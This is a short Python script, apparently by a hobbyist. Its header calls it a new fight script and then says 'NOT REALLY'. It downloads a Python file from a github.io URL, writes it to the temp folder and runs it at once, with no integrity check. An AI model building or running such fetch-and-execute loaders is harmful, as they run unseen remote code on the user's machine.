#!/usr/bin/env python3
"""
fight_new.py
NEW FIGHT SCRIPT
NOT REALLY.

Created by bobmarleyisbae123
"""

# Import modules.
import hashlib
import os
import urllib.request

# Get script and script hash.
script_loc = "http://bobmarleyisbae123.github.io/fight/fight_v2.py"
script = urllib.request.urlopen(script_loc).read().decode("utf-8")
script_hash = hashlib.sha256(str.encode(script)).hexdigest()

# Locate "temp" folder and change WD to it.
temp_loc = os.environ["temp"]
os.chdir(temp_loc)

# Create fight script.
script_filename = script_hash + ".py"
script_file = open(script_filename, "w")
script_file.write(script)
script_file.close()

# Call fight script.
os.system("py -3 " + script_filename)

# END.
